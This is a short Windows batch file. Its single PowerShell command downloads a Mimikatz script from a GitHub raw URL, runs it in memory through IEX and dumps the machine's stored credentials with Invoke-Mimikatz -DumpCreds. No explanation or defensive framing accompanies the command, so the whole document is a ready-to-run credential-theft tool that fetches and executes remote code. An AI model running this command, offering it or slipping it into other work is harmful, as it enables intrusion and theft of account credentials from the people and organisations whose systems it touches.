@echo off
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/chackco/poc/master/mimikatz.ps1.txt'); $m = Invoke-Mimikatz -DumpCreds; $m
